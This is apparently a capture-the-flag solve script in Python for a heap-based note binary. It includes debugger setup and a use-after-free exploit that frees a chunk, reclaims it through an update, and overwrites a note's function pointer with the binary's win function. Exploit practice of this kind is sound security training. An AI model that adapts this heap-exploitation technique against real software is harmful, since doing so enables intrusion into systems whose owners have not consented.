#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    # log_level='debug',
    binary=ELF('./chall', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata

d2d_ida
b *0x401870
b *0x401941
b *0x401924
b *0x401815
b *0x40182D
b *0x4014D5
b *0x40172F
b *0x4016D2
b *0x4016D2
b *0x4018D5
b *0x40148E
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def create(size: int, content: bytes):
    slna(b':', 1)
    slna(b':', size)
    sa(b':', content)

def update(idx: int, size: int, content: bytes):
    slna(b':', 2)
    slna(b':', idx)
    slna(b':', size)
    sa(b':', content)

def delete(idx: int):
    slna(b':', 3)
    slna(b':', idx)

def view(idx: int):
    slna(b':', 4)
    slna(b':', idx)

# ==================== EXPLOIT ====================
p = start()

# 0x4040c0 <list>

create(0x38, b'0' * 16)
create(0x18, b'1' * 16)

delete(0)

# Update chunk 1 to larger content size -> malloc(0x20) -> malloc from bins (chunk 0)
# Now we can be able to edit Node 0
update(1, 0x20, p64(exe.sym.win) + p64(0) + p64(0x404a00))

view(0) # View note 0 because the pointer still their

interactive()
